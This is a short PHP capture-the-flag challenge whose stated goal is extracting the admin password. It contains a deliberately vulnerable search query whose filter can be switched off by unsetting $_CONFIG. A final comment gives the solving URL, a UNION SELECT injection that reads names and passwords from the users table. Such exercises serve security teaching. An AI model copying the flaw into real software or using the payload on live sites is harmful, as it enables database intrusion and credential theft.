<?php 
#GOAL:get password from admin
# $yourInfo=array(
#   'id'    => 1,
#   'name'  => 'admin',
#   'pass'  => 'xxx',
#   'level' => 1
# );
require 'db.inc.php';
   
$_CONFIG['extraSecure']=true;
   
//if register globals = on, undo var overwrites
foreach(array('_GET','_POST','_REQUEST','_COOKIE') as $method){
     foreach($$method as $key=>$value){
          unset($$key);
     }
}
   
$kw = isset($_GET['kw']) ? trim($_GET['kw']) : die('Please enter in a search keyword.');
   
if($_CONFIG['extraSecure']){
     $kw=preg_replace('#[^a-z0-9_-]#i','',$kw);
}
   
$query = 'SELECT * FROM messages WHERE message LIKE \'%'.$kw.'%\';';
   
$result = mysql_query($query);
$row = mysql_fetch_assoc($result);
   
echo "id: ".$row['id']."</br>";
echo "message: ".$row['message']."</br>";


//http://php4fun.sinaapp.com/c4/index.php?kw='%20and%200%20union%20select%20name,pass%20from%20users%20where%20id=1%23&_CONFIG=aaa  
